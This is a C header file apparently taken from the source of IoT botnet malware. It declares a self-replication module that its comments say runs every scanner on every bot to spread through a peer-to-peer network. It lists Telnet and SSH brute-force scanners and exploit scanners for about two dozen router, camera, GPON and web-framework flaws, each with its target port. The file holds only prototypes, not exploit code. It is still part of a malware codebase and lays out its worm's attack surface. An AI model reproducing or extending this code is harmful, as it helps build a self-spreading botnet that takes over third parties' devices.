#ifndef _SELFREP_H
#define _SELFREP_H

#include "includes.h"

/*
 * Self-replication - All scanners integrated into every bot
 * Every bot runs ALL scanners to spread through the P2P torrent network
 */

/* Telnet brute-force scanner (port 23) */
void telnet_scanner_init(void);

/* SSH brute-force scanner (port 22) */
void ssh_scanner_init(void);

/* Huawei SOAP RCE (port 37215) */
void huawei_scanner_init(void);

/* Zyxel command injection (port 8080) */
void zyxel_scanner_init(void);

/* DVR camera exploit (port 80) */
void dvr_scanner_init(void);

/* Zhone ONT/OLT exploit (port 80) */
void zhone_scanner_init(void);

/* Fiber/GPON exploit (port 80) */
void fiber_scanner_init(void);

/* ADB/UPnP RCE (port 5555) */
void adb_scanner_init(void);

/* D-Link SOAP RCE (port 80/8080) */
void dlink_scanner_init(void);

/* HiLink exploit (port 80) */
void hilink_scanner_init(void);

/* XiongMai camera exploit (port 34599) */
void xm_scanner_init(void);

/* ASUS router command injection (port 8080) */
void asus_scanner_init(void);

/* JAWS web server exploit (port 80) */
void jaws_scanner_init(void);

/* Linksys WRT exploit (port 55555) */
void linksys_scanner_init(void);

/* Linksys port 8080 variant */
void linksys8080_scanner_init(void);

/* HNAP1 SOAP RCE (port 8081) */
void hnap_scanner_init(void);

/* Netlink router exploit (port 1723) */
void netlink_scanner_init(void);

/* TR-064 SOAP exploit (port 7547) */
void tr064_scanner_init(void);

/* Realtek SDK UPnP exploit (port 52869) */
void realtek_scanner_init(void);

/* ThinkPHP framework RCE (port 80) */
void thinkphp_scanner_init(void);

/* Telnet auth bypass (port 23) */
void telnetbypass_scanner_init(void);

/* GPON command injection (port 80/8080) */
void gpon_scanner_init(void);

/* GoAhead web server exploit (port 81) */
void goahead_scanner_init(void);

/* Master self-replication initializer - starts ALL scanners */
void selfrep_init(void);

#endif
